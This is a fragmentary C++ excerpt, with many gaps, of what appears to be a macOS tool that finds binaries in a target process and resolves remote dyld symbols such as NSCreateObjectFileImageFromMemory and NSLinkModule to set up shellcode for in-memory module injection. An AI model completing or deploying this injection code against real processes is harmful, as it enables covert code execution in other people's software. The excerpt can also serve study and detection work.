...
kern_return_t find_all_binaries(pid_t pid, std::vector<std::pair<std::string, const uintptr_t>>& machHeaderAddresses, vm_map_t targetTask)
{
    ...
    for (int j = 0; j < allImages.infoArrayCount; ++j)
    {
        ...
        // Empty dynamic library names are interesting...
        if (mh.filetype == MH_EXECUTE || ContainsSearchTerm(imageName) || imageName.empty() == true)
        {
...
int32_t main(int32_t argc, char* argv[])
{
    ...
    if (ret == KERN_SUCCESS)
    {
        ...
        const size_t SIZE_OF_SHELLCODE_MAYBE = 330;
        ...
        for (auto symbolAddressPair : symbolsToAddressMap)
        {
            std::cout << "Symbol " << symbolAddressPair.first << " found at remote adddress 0x" << std::hex << symbolAddressPair.second << std::endl;
        }
        
        uintptr_t remoteNSCreateObjectFileImageFromMemory = symbolsToAddressMap["_NSCreateObjectFileImageFromMemory"];
        uintptr_t remoteNSAddressOfSymbol                 = symbolsToAddressMap["_NSAddressOfSymbol"];
        uintptr_t remoteNSLinkModule                      = symbolsToAddressMap["_NSLinkModule"];
        uintptr_t remoteNSLookUpSymbol                    = symbolsToAddressMap["_NSLookupSymbolInModule"];
        ...
        args.pNSAddressOfSymbol  = reinterpret_cast<NSAddressOfSymbol_t>(remoteNSAddressOfSymbol);
        args.pNSLinkModule       = reinterpret_cast<NSLinkModule_t>(remoteNSLinkModule);
        args.pNSLookUpSymbol     = reinterpret_cast<NSLookupSymbolInModule_t>(remoteNSLookUpSymbol);
        args.pNSCreateObjectFile = reinterpret_cast<NSCreateObjectFile_t>(remoteNSCreateObjectFileImageFromMemory);
